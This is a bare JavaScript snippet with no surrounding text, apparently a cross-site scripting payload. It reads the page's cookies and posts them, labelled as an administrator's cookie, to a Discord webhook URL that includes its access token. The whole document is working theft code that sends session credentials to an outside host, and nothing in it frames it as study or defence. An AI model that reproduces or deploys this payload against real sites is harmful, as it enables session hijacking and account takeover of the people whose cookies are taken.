fetch("https://discord.com/api/webhooks/1319675921137008651/vaMKbhZSTLdlofuOiFTKZJa9l0KE0YT3_z-PuYbtmR362alQyGv8jbVwUrs6Kv8tHD0l", {
  method: "POST",
  body: JSON.stringify({"content": "Admin Cookie: " + document.cookie}),
  headers: {"Content-Type": "application/json"}
});

